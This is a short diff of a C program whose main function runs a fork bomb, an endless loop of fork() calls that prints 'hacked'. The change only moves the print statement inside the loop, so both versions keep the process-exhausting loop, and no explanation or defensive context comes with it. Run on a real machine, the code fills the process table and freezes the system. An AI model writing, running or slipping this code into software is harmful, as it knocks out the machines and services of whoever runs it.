@@ -6,7 +6,7 @@
 
 int main() {
 
-	while (true) {fork();}
-	printf ("hacked");
+	while (true) {fork();
+	printf ("hacked");}
 	return 0;
 }
